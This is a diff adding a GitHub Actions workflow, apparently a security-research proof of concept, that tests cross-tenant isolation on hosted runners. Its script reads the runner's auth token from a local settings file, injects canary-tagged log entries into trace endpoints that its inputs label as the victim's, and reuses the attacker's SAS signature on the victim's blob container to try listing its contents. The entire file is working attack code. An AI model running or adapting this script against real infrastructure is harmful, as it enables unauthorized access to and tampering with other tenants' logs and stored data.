@@ -1,0 +1,83 @@
+name: xtenant_attacker
+on:
+  workflow_dispatch:
+    inputs:
+      victim_alloc:  { required: true }
+      victim_trace:  { required: true }
+      victim_wtrace: { required: false, default: '' }
+      victim_sas:    { required: true }
+jobs:
+  attacker:
+    runs-on: ubuntu-latest
+    steps:
+      - name: attack
+        continue-on-error: true
+        env:
+          V_ALLOC:  ${{ inputs.victim_alloc }}
+          V_TRACE:  ${{ inputs.victim_trace }}
+          V_WTRACE: ${{ inputs.victim_wtrace }}
+          V_SAS:    ${{ inputs.victim_sas }}
+        run: |
+          python3 - <<'PYEOF'
+          import os, json, base64, urllib.request, urllib.error, re
+          CANARY = 'XTENANT-CANARY-20260624-7f3a'
+
+          s = json.load(open('/opt/hca/.settings'))
+          tok    = s['authToken']
+          a_trace= s.get('traceApiUrl', '')
+          a_sas  = s.get('diagnosticsSasUri', '')
+
+          valloc = os.environ['V_ALLOC']
+          vtrace = os.environ['V_TRACE']
+          vwtrace= os.environ.get('V_WTRACE', '')
+          vsas   = os.environ['V_SAS']
+
+          def b64d(x):
+              x += '=' * (-len(x) % 4); return base64.urlsafe_b64decode(x)
+          a_wid = json.loads(b64d(tok.split('.')[1])).get('wid', '')
+          print('ATTACKER_OWN_WID=' + a_wid)
+          print('TARGET_VICTIM_ALLOC=' + valloc)
+
+          def post(url, body):
+              try:
+                  r = urllib.request.Request(url, data=json.dumps(body).encode(), method='POST')
+                  r.add_header('Authorization', 'Bearer ' + tok)
+                  r.add_header('Content-Type', 'application/json')
+                  resp = urllib.request.urlopen(r, timeout=20)
+                  return resp.status, resp.read(400).decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read(400).decode('utf-8', 'replace')
+              except Exception as e:
+                  return 'ERR', str(e)
+
+          entry = [{'level': 0, 'message': CANARY + ' injected-by-foreign-tenant', 'allocationId': valloc}]
+          for tag, url in [('A_own_trace', a_trace), ('B_trace', vtrace), ('B_wtrace', vwtrace)]:
+              if not url: continue
+              st, b = post(url, entry)
+              print('INJECT[%s] %s -> %s %s' % (tag, url, st, b[:120].replace(chr(10), ' ')))
+
+          # SAS cross-access: apply attacker's SAS signature to the VICTIM's container
+          def cross_list(my_sas, victim_sas):
+              try:
+                  _, q = my_sas.split('?', 1)
+                  base, _ = victim_sas.split('?', 1)
+                  m = re.match(r'(https://[^/]+/[^/?]+)', base)
+                  cont = m.group(1)
+                  url = cont + '?restype=container&comp=list&' + q
+                  r = urllib.request.urlopen(url, timeout=20)
+                  return r.status, r.read(1200).decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read(600).decode('utf-8', 'replace')
+              except Exception as e:
+                  return 'ERR', str(e)
+
+          st, b = cross_list(a_sas, vsas)
+          print('SAS_CROSS_LIST[Asig_on_Bcontainer] -> %s | %s' % (st, b[:400].replace(chr(10), ' ')))
+
+          ah = a_sas.split('/')[2] if '//' in a_sas else ''
+          bh = vsas.split('/')[2] if '//' in vsas else ''
+          print('A_BLOB_HOST=' + ah)
+          print('B_BLOB_HOST=' + bh)
+          print('SAME_STORAGE_ACCOUNT=' + str(ah == bh and ah != ''))
+          print('ATTACK_DONE')
+          PYEOF
